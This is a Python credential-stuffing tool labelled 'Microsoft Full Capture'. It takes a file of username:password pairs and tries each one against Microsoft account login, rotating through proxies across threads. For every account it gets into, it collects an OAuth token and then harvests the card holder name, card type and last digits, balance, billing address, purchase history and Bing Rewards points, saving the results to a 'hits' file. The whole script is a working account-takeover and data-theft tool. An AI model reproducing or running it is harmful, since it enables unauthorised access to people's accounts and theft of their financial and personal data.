import requests
import re
import json
from urllib.parse import unquote, quote
import threading
import queue
import sys
import os
import random
import time
from colorama import Fore, Style, init as colorama_init

def anasxzer00(source_text, left_str, right_str, var_name, variables, create_empty=True, prefix="", suffix=""):
    try:
        match = re.search(f"{re.escape(left_str)}(.*?){re.escape(right_str)}", source_text, re.DOTALL)
        if match:
            value = match.group(1)
            variables[var_name] = f"{prefix}{value}{suffix}"
            return True
        else:
            if create_empty:
                variables[var_name] = ""
            return False
    except Exception:
        if create_empty:
            variables[var_name] = ""
        return False

def anasJsonKey(source_text, key, var_name, variables, create_empty=True, prefix="", suffix=""):
    try:
        data = json.loads(source_text)
        if key in data:
            value = data[key]
            variables[var_name] = f"{prefix}{value}{suffix}"
            return True
        else:
            if create_empty:
                variables[var_name] = ""
            return False
    except json.JSONDecodeError:
        if create_empty:
            variables[var_name] = ""
        return False
    except Exception:
        if create_empty:
            variables[var_name] = ""
        return False
anasMax = 10
anasTimeOut = 15
anasMaxPer = 100

stats = {
    "hits": 0,
    "anasxzer00": 0,
    "coded by anasxzer00": 0,
    "bad": 0,
    "retries": 0,
    "two_factor": 0,
    "custom_unknown": 0,
    "checked": 0,
    "total_combos": 0,
    "proxy_errors": 0
}
anasStatusL = threading.Lock()
anasOutput = threading.Lock()

anasPPFT = "-Dim7vMfzjynvFHsYUX3COk7z2NZzCSnDj42yEbbf18uNb%21Gl%21I9kGKmv895GTY7Ilpr2XXnnVtOSLIiqU%21RssMLamTzQEfbiJbXxrOD4nPZ4vTDo8s*CJdw6MoHmVuCcuCyH1kBvpgtCLUcPsDdx09kFqsWFDy9co%21nwbCVhXJ*sjt8rZhAAUbA2nA7Z%21GK5uQ%24%24"
anasBK = "1665024852"
anasUAID = "a5b22c26bc704002ac309462e8d061bb"

def anasRetries(session, method, url, step_name, retries_counter_list, **kwargs):
    for attempt in range(anasMaxPer + 1):
        try:
            response = session.request(method, url, timeout=anasTimeOut, **kwargs)
            return response
        except (requests.exceptions.ProxyError, requests.exceptions.SSLError) as e:
            if retries_counter_list:
                 retries_counter_list[0] +=1
            raise
        except requests.exceptions.RequestException as e:
            if attempt < anasMaxPer:
                if retries_counter_list:
                    retries_counter_list[0] += 1
                time.sleep(1 + attempt)
                continue
            else:
                raise
    return None


def anasChkAccount(user_pass_line, proxy_dict_for_session):
    user, password = user_pass_line.split(':', 1)
    
    variables = {'USER': user, 'PASS': password}
    captures = {}
    current_status_internal = "UNKNOWN_INIT"
    account_retry_attempts = [0] 

    session = requests.Session()
    if proxy_dict_for_session:
        session.proxies = proxy_dict_for_session
    try:
        url_login = f"https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username={quote(variables['USER'])}&contextid=2CCDB02DC526CA71&bk={anasBK}&uaid={anasUAID}&pid=15216"
        
        payload_login_template = "ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=1&login=<USER>&loginfmt=<USER>&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=<PASS>"
        payload_login = payload_login_template.replace("<USER>", variables['USER']) \
                                              .replace("<PASS>", variables['PASS']) \
                                              .replace("{ppft}", anasPPFT)

        headers_login = {
            "Host": "login.live.com",
            "Cache-Control": "max-age=0",
            "sec-ch-ua": "\"Microsoft Edge\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": f"https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&uaid={anasUAID}&display=touch&username={quote(variables['USER'])}",
            "Accept-Language": "en-US,en;q=0.9",
            "Cookie": "CAW=%3CEncryptedData%20xmlns%3D%22http://www.w3.org/2001/04/xmlenc%23%22%20Id%3D%22BinaryDAToken1%22%20Type%3D%22http://www.w3.org/2001/04/xmlenc%23Element%22%3E%3CEncryptionMethod%20Algorithm%3D%22http://www.w3.org/2001/04/xmlenc%23tripledes-cbc%22%3E%3C/EncryptionMethod%3E%3Cds:KeyInfo%20xmlns:ds%3D%22http://www.w3.org/2000/09/xmldsig%23%22%3E%3Cds:KeyName%3Ehttp://Passport.NET/STS%3C/ds:KeyName%3E%3C/ds:KeyInfo%3E%3CCipherData%3E%3CCipherValue%3EM.C534_BAY.0.U.CqFsIZLJMLjYZcShFFeq37gPy/ReDTOxI578jdvIQe34OFFxXwod0nSinliq0/kVdaZSdVum5FllwJWBbzH7LQqQlNIH4ZRpA4BmNDKVZK9APSoJ%2BYNEFX7J4eX4arCa69y0j3ebxxB0ET0%2B8JKNwx38dp9htv/fQetuxQab47sTb8lzySoYn0RZj/5NRQHRFS3PSZb8tSfIAQ5hzk36NsjBZbC7PEKCOcUkePrY9skUGiWstNDjqssVmfVxwGIk6kxfyAOiV3on%2B9vOMIfZZIako5uD3VceGABh7ZxD%2BcwC0ksKgsXzQs9cJFZ%2BG1LGod0mzDWJHurWBa4c0DN3LBjijQnAvQmNezBMatjQFEkB4c8AVsAUgBNQKWpXP9p3pSbhgAVm27xBf7rIe2pYlncDgB7YCxkAndJntROeurd011eKT6/wRiVLdym6TUSlUOnMBAT5BvhK/AY4dZ026czQS2p4NXXX6y2NiOWVdtDyV51U6Yabq3FuJRP9PwL0QA%3D%3D%3C/CipherValue%3E%3C/CipherData%3E%3C/EncryptedData%3E;DIDC=ct%3D1716398701%26hashalg%3DSHA256%26bver%3D35%26appid%3DDefault%26da%3D%253CEncryptedData%2520xmlns%253D%2522http://www.w3.org/2001/04/xmlenc%2523%2522%2520Id%253D%2522devicesoftware%2522%2520Type%253D%2522http://www.w3.org/2001/04/xmlenc%2523Element%2522%253E%253CEncryptionMethod%2520Algorithm%253D%2522http://www.w3.org/2001/04/xmlenc%2523tripledes-cbc%2522%253E%253C/EncryptionMethod%253E%253Cds:KeyInfo%2520xmlns:ds%253D%2522http://www.w3.org/2000/09/xmldsig%2523%2522%253E%253Cds:KeyName%253Ehttp://Passport.NET/STS%253C/ds:KeyName%253E%253C/ds:KeyInfo%253E%253CCipherData%253E%253CCipherValue%253EM.C537_BL2.0.D.Cj3b1fsY2Od2XaOlux/ytnFV4P9O69MsOlTuMxcP%252BKcIXlN4LPe7PoIP%252BHod6dialSv2/Hn5WivP0tHDuapNs99br8ndlpchQBiDEfuZDB816HK4qNq47xUrH8w/g77BxZnDfd3SPd7MoFLX4kGIm3LetDBJBqs1DruULzCK8RcdqWHgTudWf3Z5%252Bk1cIm2uEcMHHtw/Yh3Hkakhzec4M7H2WKKHLuSgLVf8imq8U23NWU19T/l8nh/zoWHkZUGqF5FkORhAnYRMr3YKJMcCuX4SdFRGlesuWd87QwIRwEyBOx6bKgGIdIf9cjIYju78CcDMay4JKudVx2NZltZLhH7qJwbyR9WMjrp32KijN/KsDwzR4kh5CkBelM4DPHuArCPgcbUQhE4yZz1b2BsZLR38EAm4fUhHOG8gFKKN3B1j6%252Bi9mmYX163DDWVEBhQLqzOD0dmCqZisPGpaGxZpUBJAGBLL1CpEsMuccqnq3UZlE08n4b1bD2b5os3gncshpg%253D%253D%253C/CipherValue%253E%253C/CipherData%253E%253C/EncryptedData%253E%26nonce%3DdOCSsum2b4e5E3zU3dM8YytFCYFx8DaH%26hash%3D7vtcbsk2TLGvJuTXm4JqCEVt2sgz9wxd3lSx61Dybnk%253D%26dd%3D1;DIDCL=ct%3D1716398701%26hashalg%3DSHA256%26bver%3D35%26appid%3DDefault%26da%3D%253CEncryptedData%2520xmlns%253D%2522http://www.w3.org/2001/04/xmlenc%2523%2522%2520Id%253D%2522devicesoftware%2522%2520Type%253D%2522http://www.w3.org/2001/04/xmlenc%2523Element%2522%253E%253CEncryptionMethod%2520Algorithm%253D%2522http://www.w3.org/2001/04/xmlenc%2523tripledes-cbc%2522%253E%253C/EncryptionMethod%253E%253Cds:KeyInfo%2520xmlns:ds%253D%2522http://www.w3.org/2000/09/xmldsig%2523%2522%253E%253Cds:KeyName%253Ehttp://Passport.NET/STS%253C/ds:KeyName%253E%253C/ds:KeyInfo%253E%253CCipherData%253E%253CCipherValue%253EM.C537_BL2.0.D.Cj3b1fsY2Od2XaOlux/ytnFV4P9O69MsOlTuMxcP%252BKcIXlN4LPe7PoIP%252BHod6dialSv2/Hn5WivP0tHDuapNs99br8ndlpchQBiDEfuZDB816HK4qNq47xUrH8w/g77BxZnDfd3SPd7MoFLX4kGIm3LetDBJBqs1DruULzCK8RcdqWHgTudWf3Z5%252Bk1cIm2uEcMHHtw/Yh3Hkakhzec4M7H2WKKHLuSgLVf8imq8U23NWU19T/l8nh/zoWHkZUGqF5FkORhAnYRMr3YKJMcCuX4SdFRGlesuWd87QwIRwEyBOx6bKgGIdIf9cjIYju78CcDMay4JKudVx2NZltZLhH7qJwbyR9WMjrp32KijN/KsDwzR4kh5CkBelM4DPHuArCPgcbUQhE4yZz1b2BsZLR38EAm4fUhHOG8gFKKN3B1j6%252Bi9mmYX163DDWVEBhQLqzOD0dmCqZisPGpaGxZpUBJAGBLL1CpEsMuccqnq3UZlE08n4b1bD2b5os3gncshpg%253D%253D%253C/CipherValue%253E%253C/CipherData%253E%253C/EncryptedData%253E%26nonce%3DdOCSsum2b4e5E3zU3dM8YytFCYFx8DaH%26hash%3D7vtcbsk2TLGvJuTXm4JqCEVt2sgz9wxd3lSx61Dybnk%253D%26dd%3D1;MSPRequ=id=N&lt=1716398680&co=1; uaid=a5b22c26bc704002ac309462e8d061bb; MSPOK=$uuid-175ae920-bd12-4d7c-ad6d-9b92a6818f89; OParams=11O.DlK9hYdFfivp*0QoJiYT2Qy83kFNo*ZZTQeuvQ0LQzYIADO3zbs*Hic1wfggJcJ6IjaSW0uhkJA2V2qHoF6Uijtl4S917NbRSYxGy0zbqEYtcXAlWZZCQUyVeRoEZT9xiChsk8JTXV2xPusIXRCRpyflM376GGcjUFMaQZuR6PPITnzwgJTeCj6iMAXKEyR5ougzXlltimdTufqAZLwLiC8a8U2ifLfQXP6ibI2Uk!8vBkegcZ73OpR2J2XPd0XeNEt7zVuUQnsbzmSKT3QetSepbGHhx*bkq8c0KyMZcq08dnJVvcPGwI2NNnN3hI1kytasvECwkKYbPIzVX*cA8jbyVqsQRoGWMTr7gGB4Z5BDteRuWO8tuVBRpn9spWtoBQv5CqOvPptW7kV0n1jrYxU$; MicrosoftApplicationsTelemetryDeviceId=49a10983-52d4-43ed-9a94-14ac360a5683; ai_session=K/6T8kGCWbit7HtaRqLso3|1716398680878|1716398680878; MSFPC=GUID=09547181a6984b52ad37278edb4b6ee6&HASH=0954&LV=202405&V=4&LU=1714868413949"
        }
        
        response_login = anasRetries(session, 'POST', url_login, "Login", account_retry_attempts, headers=headers_login, data=payload_login, allow_redirects=True)
        if not response_login: return "NETWORK_ERROR_LOGIN", None, account_retry_attempts[0]
        response_text = response_login.text
        response_url = response_login.url

        if "Your account or password is incorrect." in response_text or \
           "That Microsoft account doesn\\'t exist. Enter a different account" in response_text or \
           ("Sign in to your Microsoft account" in response_text and "oauth20_desktop.srf#access_token=" not in response_url and "oauth20_desktop.srf?" not in response_url) :
            current_status_internal = "FAILURE_CREDENTIALS"
        elif ",AC:null,urlFedConvertRename" in response_text:
            current_status_internal = "BAN_LOCKED"
        elif "timed out" in response_text.lower():
            current_status_internal = "FAILURE_TIMEOUT_MSG"
        elif "account.live.com/recover" in response_text or \
             "account.live.com/identity/confirm" in response_text or \
             "Email/Confirm" in response_text:
            current_status_internal = "2FACTOR_VERIFICATION"
        elif "/cancel?mkt=" in response_text or "/Abuse?mkt=" in response_text:
            current_status_internal = "CUSTOM_LOCK_ABUSE"
        else:
            success_cookie_found = any(cookie.name in ["ANON", "WLSSC"] for cookie in session.cookies)
            successful_redirect = "oauth20_desktop.srf#access_token=" in response_url or \
                                  "https://login.live.com/oauth20_desktop.srf?" in response_url
            
            if successful_redirect or success_cookie_found:
                current_status_internal = "SUCCESS_LOGIN_STEP"
            elif response_login.status_code == 200 and "https://login.live.com/ppsecure/post.srf" in response_url and not success_cookie_found:
                current_status_internal = "FAILURE_LOGIN_UNKNOWN_STUCK_ON_POST"
            else:
                current_status_internal = "FAILURE_LOGIN_UNKNOWN"


    except requests.exceptions.ProxyError:
        return "PROXY_ERROR", None, account_retry_attempts[0]
    except requests.exceptions.RequestException:
        return "NETWORK_ERROR_LOGIN", None, account_retry_attempts[0]
    if current_status_internal != "SUCCESS_LOGIN_STEP":
        if current_status_internal == "FAILURE_CREDENTIALS": return "BAD_CREDENTIALS", None, account_retry_attempts[0]
        if current_status_internal == "2FACTOR_VERIFICATION": return "2FA_REQUIRED", None, account_retry_attempts[0]
        if current_status_internal in ["BAN_LOCKED", "CUSTOM_LOCK_ABUSE"]: return "ACCOUNT_ISSUE", None, account_retry_attempts[0]
        return "LOGIN_FAILED_OTHER", None, account_retry_attempts[0]
    try:
        url_oauth_auth = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none"
        headers_oauth_auth = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Referer": "https://account.microsoft.com/"
        }
        response_oauth_auth = anasRetries(session, 'GET', url_oauth_auth, "OAuth", account_retry_attempts, headers=headers_oauth_auth, allow_redirects=True)
        if not response_oauth_auth: return "NETWORK_ERROR_OAUTH", None, account_retry_attempts[0]

        token_found_in_url = False
        if "access_token=" in response_oauth_auth.url:
            if anasxzer00(response_oauth_auth.url, "access_token=", "&token_type", "Token", variables):
                token_found_in_url = True
        
        if not token_found_in_url:
            return "TOKEN_ERROR_OAUTH_PARSE", None, account_retry_attempts[0]
        
        if variables.get("Token"):
            variables["Token_decoded"] = unquote(variables["Token"]) 
        else: 
            return "TOKEN_ERROR_OAUTH_MISSING", None, account_retry_attempts[0]
    except requests.exceptions.ProxyError:
        return "PROXY_ERROR", None, account_retry_attempts[0]
    except requests.exceptions.RequestException:
        return "NETWORK_ERROR_OAUTH", None, account_retry_attempts[0]
    payment_api_response_status = "UNKNOWN_PAYMENT_API"
    try:
        if not variables.get("Token"):
            return "TOKEN_ERROR_MISSING_FOR_PAYMENT", None, account_retry_attempts[0]
        url_payment_instruments = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
        headers_payment_instruments = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.9",
            "Authorization": f"MSADELEGATE1.0=\"{variables['Token']}\"",
            "Content-Type": "application/json",
            "Host": "paymentinstruments.mp.microsoft.com",
            "Origin": "https://account.microsoft.com",
            "Referer": "https://account.microsoft.com/",
            "Sec-Fetch-Dest": "empty", 
            "Sec-Fetch-Mode": "cors", 
            "Sec-Fetch-Site": "same-site",
        }
        response_payment_instruments = anasRetries(session, 'GET', url_payment_instruments, "PaymentInstruments", account_retry_attempts, headers=headers_payment_instruments)
        if not response_payment_instruments: return "NETWORK_ERROR_PAYMENT_INSTRUMENTS", None, account_retry_attempts[0]
        payment_data_text = response_payment_instruments.text
        if response_payment_instruments.status_code == 200:
            anasxzer00(payment_data_text, 'balance":', ',"', "Balance", variables, prefix="$")
            anasxzer00(payment_data_text, 'paymentMethodFamily":"credit_card","display":{"name":"', '"', "CardTypeLast4", variables) # Card type + last4
            anasxzer00(payment_data_text, 'accountHolderName":"', '","', "AccountHolderName", variables)
            anasxzer00(payment_data_text, '"postal_code":"', '",', "Zipcode", variables)
            anasxzer00(payment_data_text, '"region":"', '",', "Region", variables)
            anasxzer00(payment_data_text, '"address_line1":"', '",', "Address1", variables)
            anasxzer00(payment_data_text, '"city":"', '",', "City", variables)
            captures["Address"] = f"[ Address: {variables.get('Address1', 'N/A')}, City: {variables.get('City', 'N/A')}, State: {variables.get('Region', 'N/A')}, Postalcode: {variables.get('Zipcode', 'N/A')} ]"            
            if not variables.get("CardTypeLast4") and not variables.get("Balance"):
                payment_api_response_status = "SUCCESS_PAYMENT_NO_INFO"
            else:
                payment_api_response_status = "SUCCESS_PAYMENT_INFO"
        elif response_payment_instruments.status_code == 401:
            return "PAYMENT_API_ERROR_UNAUTHORIZED", None, account_retry_attempts[0]
        else:
            return "PAYMENT_API_ERROR_OTHER", None, account_retry_attempts[0]

    except requests.exceptions.ProxyError:
        return "PROXY_ERROR", None, account_retry_attempts[0]
    except requests.exceptions.RequestException:
        return "NETWORK_ERROR_PAYMENT_INSTRUMENTS", None, account_retry_attempts[0]
    transaction_api_response_status = "SKIPPED_TRANSACTIONS"
    if payment_api_response_status in ["SUCCESS_PAYMENT_INFO", "SUCCESS_PAYMENT_NO_INFO"]:
        try:
            url_payment_transactions = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
            headers_payment_transactions = headers_payment_instruments 
            response_payment_transactions = anasRetries(session, 'GET', url_payment_transactions, "PaymentTransactions", account_retry_attempts, headers=headers_payment_transactions)
            if not response_payment_transactions: return "NETWORK_ERROR_TRANSACTIONS", None, account_retry_attempts[0]

            transactions_data_text = response_payment_transactions.text
            if response_payment_transactions.status_code == 200:
                anasxzer00(transactions_data_text, 'country":"', '"}', "Country", variables)
                anasxzer00(transactions_data_text, 'title":"', '",', "Item 1", variables) 
                anasxzer00(transactions_data_text, '"autoRenew":', ',', "autoRenew", variables)
                anasxzer00(transactions_data_text, '"startDate":"', 'T', "startDate", variables)
                anasxzer00(transactions_data_text, '"nextRenewalDate":"', 'T', "nextRenewalDate", variables)
                anasxzer00(transactions_data_text, 'description":"', '",', "TransactionDescription", variables)
                anasJsonKey(transactions_data_text, "quantity", "Quantity_json", variables)
                anasJsonKey(transactions_data_text, "currency", "CURRENCY", variables)
                temp_total_amount = {} 
                if anasJsonKey(transactions_data_text, "totalAmount", "totalAmount_json", temp_total_amount):
                     variables["totalAmount_json_formatted"] = f"{variables.get('CURRENCY','')} {temp_total_amount['totalAmount_json']}"
                
                transaction_api_response_status = "SUCCESS_TRANSACTIONS_PARSED"

            elif response_payment_transactions.status_code == 401:
                 return "TRANSACTION_API_ERROR_UNAUTHORIZED", None, account_retry_attempts[0]
            else:
                 return "TRANSACTION_API_ERROR_OTHER", None, account_retry_attempts[0]
        
        except requests.exceptions.ProxyError:
            return "PROXY_ERROR", None, account_retry_attempts[0]
        except requests.exceptions.RequestException:
            return "NETWORK_ERROR_TRANSACTIONS", None, account_retry_attempts[0]    
    try:
        url_rewards = "https://rewards.bing.com/"
        headers_rewards = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
        }
        response_rewards = anasRetries(session, 'GET', url_rewards, "Rewards", account_retry_attempts, headers=headers_rewards, allow_redirects=True)
        if response_rewards : 
            rewards_data_text = response_rewards.text
            if anasxzer00(rewards_data_text, ',"availablePoints":', ',"', "points_val", variables, create_empty=False):
                captures["points"] = variables["points_val"]
            elif anasxzer00(rewards_data_text, 'pointsAvailable":', ',', "points_val", variables, create_empty=False):
                captures["points"] = variables["points_val"]
            else:
                captures["points"] = "N/A"
        else:
            captures["points"] = "N/A (Error)"

    except requests.exceptions.ProxyError:
        return "PROXY_ERROR", None, account_retry_attempts[0]
    except requests.exceptions.RequestException:
        captures["points"] = "N/A (Error)"
    if payment_api_response_status.startswith("SUCCESS") or transaction_api_response_status.startswith("SUCCESS_TRANSACTIONS_PARSED"):
        country = variables.get("Country", "N/A")
        acc_holder_name_val = variables.get("AccountHolderName", "")
        card_holder_name_str = acc_holder_name_val if acc_holder_name_val and acc_holder_name_val != "N/A" else "No CC Linked"
        
        cc_funding = variables.get("Balance", "N/A")
        
        item1 = variables.get("Item 1", "N/A")
        purchased_items_str = f"[{item1}]" if item1 != "N/A" else "[N/A]"
        auto_renew_val = variables.get("autoRenew", "N/A").lower()
        auto_renew_str = "Yes" if auto_renew_val == "true" else ("No" if auto_renew_val == "false" else "N/A")
        
        start_date = variables.get("startDate", "N/A")
        end_date = variables.get("nextRenewalDate", "N/A")
        points = captures.get("points", "N/A") 
        hit_string = (
            f"{user_pass_line} | Country = {country} | CardHolder = {card_holder_name_str} | "
            f"CC Funding = {cc_funding} | Purchased Items = {purchased_items_str} | "
            f"Auto Renew = {auto_renew_str} | Start in = {start_date} | End in = {end_date} | "
            f"Via = @AgentThani"
        )
        return "HIT", hit_string, account_retry_attempts[0]
    else:
        return "POST_LOGIN_FAILURE_NO_DATA", None, account_retry_attempts[0]


def update_display():
    with anasStatusL:
        display_message = (
            Style.BRIGHT +
            f"\r{Fore.GREEN}Hits{Fore.WHITE}: {stats['hits']} | "
            f"{Fore.RED}Bad{Fore.WHITE}: {stats['bad']} | "
            f"{Fore.YELLOW}Retries{Fore.WHITE}: {stats['retries']} | "
            f"{Fore.MAGENTA}2FA{Fore.WHITE}: {stats['two_factor']} | "
            f"{Fore.CYAN}Unknown{Fore.WHITE}: {stats['custom_unknown']}"
        )
        sys.stdout.write(display_message)
        sys.stdout.flush()

def worker(combo_queue, proxy_list):
    while True:
        try:
            user_pass = combo_queue.get_nowait()
        except queue.Empty:
            break

        anasPrxxy2 = None
        if proxy_list:
            proxy_url = random.choice(proxy_list)
            anasPrxxy2 = {'http': proxy_url, 'https': proxy_url}


        final_status, hit_data_str, retries_for_account = anasChkAccount(user_pass, anasPrxxy2)
        
        with anasStatusL:
            stats['checked'] += 1
            stats['retries'] += retries_for_account

            if final_status == "HIT":
                stats['hits'] += 1
                if hit_data_str:
                    with anasOutput:
                        with open("Xbox-Drops.txt", "a", encoding="utf-8") as f:
                            f.write(hit_data_str + "\n")
            elif final_status == "BAD_CREDENTIALS":
                stats['bad'] += 1
            elif final_status == "2FA_REQUIRED":
                stats['two_factor'] += 1
            elif final_status == "PROXY_ERROR":
                stats['proxy_errors'] += 1 
                stats['custom_unknown'] +=1
            elif final_status in ["ACCOUNT_ISSUE", "LOGIN_FAILED_OTHER",
                                  "TOKEN_ERROR_OAUTH_PARSE", "TOKEN_ERROR_OAUTH_MISSING", 
                                  "TOKEN_ERROR_MISSING_FOR_PAYMENT", 
                                  "PAYMENT_API_ERROR_UNAUTHORIZED", "PAYMENT_API_ERROR_OTHER", 
                                  "TRANSACTION_API_ERROR_UNAUTHORIZED", "TRANSACTION_API_ERROR_OTHER", 
                                  "POST_LOGIN_FAILURE_NO_DATA",
                                  "NETWORK_ERROR_LOGIN", "NETWORK_ERROR_OAUTH", 
                                  "NETWORK_ERROR_PAYMENT_INSTRUMENTS", "NETWORK_ERROR_TRANSACTIONS"]:
                stats['custom_unknown'] += 1
            else:
                stats['custom_unknown'] += 1 

        update_display()
        combo_queue.task_done()

def get_proxies():
    proxies = []
    proxy_file_path = input(f"{Style.BRIGHT} [+] Put Proxies File (Enter 1 for none): {Style.RESET_ALL}").strip()

    if proxy_file_path:
        if not os.path.exists(proxy_file_path):
            print(f"{Fore.RED} [-] Proxy file not found.{Style.RESET_ALL}")
            return []
        
        try:
            with open(proxy_file_path, 'r', encoding='utf-8', errors='ignore') as f:
                raw_proxy_lines = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"{Fore.RED} [-] Error reading proxy file: {e}{Style.RESET_ALL}")
            return []
        if not raw_proxy_lines:
            print(f"{Fore.YELLOW} [!] Proxy file is empty.{Style.RESET_ALL}")
            return []
        first_proxy_has_scheme = re.match(r'^(http|https|socks4|socks5)://', raw_proxy_lines[0], re.IGNORECASE)
        chosen_proxy_scheme_for_file = None
        if not first_proxy_has_scheme:
            while True:
                ptype = input(f"{Style.BRIGHT} [+] Enter proxy type (http, socks4, socks5): {Style.RESET_ALL}").lower()
                if ptype in ['http', 'socks4', 'socks5']:
                    chosen_proxy_scheme_for_file = ptype
                    break
                elif ptype == 'https': 
                    chosen_proxy_scheme_for_file = 'http' 
                    print(f"{Fore.YELLOW} [i] For 'https' type, proxies will be formatted as '{chosen_proxy_scheme_for_file}://...'. If your proxy server itself needs HTTPS connection, ensure lines are e.g. 'https://user:pass@ip:port'.{Style.RESET_ALL}")
                    break
                else:
                    print(f"{Fore.RED} [-] Invalid proxy type. Please choose from http, socks4, socks5.{Style.RESET_ALL}")
        
        for line in raw_proxy_lines:
            current_line_scheme = chosen_proxy_scheme_for_file 
            actual_address_part = line
            scheme_match_in_line = re.match(r'^(http|https|socks4|socks5)://(.*)', line, re.IGNORECASE)
            if scheme_match_in_line:
                current_line_scheme = scheme_match_in_line.group(1).lower()
                actual_address_part = scheme_match_in_line.group(2)
            
            if not current_line_scheme:
                print(f"{Fore.YELLOW} [!] Skipping proxy line '{line}' due to missing scheme information.{Style.RESET_ALL}")
                continue

            
            auth_part = ""
            host_port_part = actual_address_part
            if "@" in actual_address_part:
                possible_auth, possible_host_port = actual_address_part.split('@', 1)

                if ':' in possible_host_port:
                    auth_cred = possible_auth
                    host_port_part = possible_host_port
                    if ":" in auth_cred:
                        user, passwd = auth_cred.split(":", 1)
                        auth_part = f"{quote(user)}:{quote(passwd)}@"
                    else:
                        auth_part = f"{quote(auth_cred)}@"
            proxies.append(f"{current_line_scheme}://{auth_part}{host_port_part}")
        
        if proxies:
            print(f"{Fore.GREEN} [+] Loaded {len(proxies)} proxies.{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW} [i] No proxy file specified. Running without proxies.{Style.RESET_ALL}")
    
    return proxies

def main():
    colorama_init(autoreset=True)
    print(Style.BRIGHT + Fore.CYAN + " -- @AgentThani | Microsoft Full Capture" + Style.RESET_ALL)
    
    combo_file = input(f"{Style.BRIGHT} [+] Put Combo: {Style.RESET_ALL}").strip()
    if not os.path.exists(combo_file):
        print(f"{Fore.RED} [-] Combo file not found! Exiting.{Style.RESET_ALL}")
        return

    try:
        with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
            combos = [line.strip() for line in f if ':' in line.strip()]
    except Exception as e:
        print(f"{Fore.RED} [-] Error reading combo file: {e}{Style.RESET_ALL}")
        return
    
    if not combos:
        print(f"{Fore.RED} [-] No valid combos (User:Pass) found in file! Exiting.{Style.RESET_ALL}")
        return

    stats['total_combos'] = len(combos)
    
    proxy_list = get_proxies()

    combo_queue = queue.Queue()
    for combo in combos:
        combo_queue.put(combo)

    if stats['total_combos'] > 0:
        print(f"{Fore.GREEN} [+] Starting checker with {stats['total_combos']} combos and up to {anasMax} workers..., Join us @XXXX_PRIVATE{Style.RESET_ALL}\n\n")
    else:
        print(f"{Fore.YELLOW} [!] No combos to check.{Style.RESET_ALL}")
        return
        
    update_display()

    threads = []
    actual_workers = min(anasMax, stats['total_combos'])
    if actual_workers == 0 and stats['total_combos'] > 0 : actual_workers = 1


    for _ in range(actual_workers):
        thread = threading.Thread(target=worker, args=(combo_queue, proxy_list))
        thread.daemon = True
        threads.append(thread)
        thread.start()

    try:
        while stats['checked'] < stats['total_combos']:
            if combo_queue.empty() and all(not t.is_alive() for t in threads):
                 break
            time.sleep(0.2)
        for thread in threads:
            if thread.is_alive():
                thread.join(timeout=anasTimeOut*2)

    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW} [!] User interrupted. Process will exit shortly...{Style.RESET_ALL}")
    
    print("\n" + Style.BRIGHT + Fore.GREEN + "Checker finished." + Style.RESET_ALL)
    update_display()
    print("\n")

if __name__ == "__main__":
    main()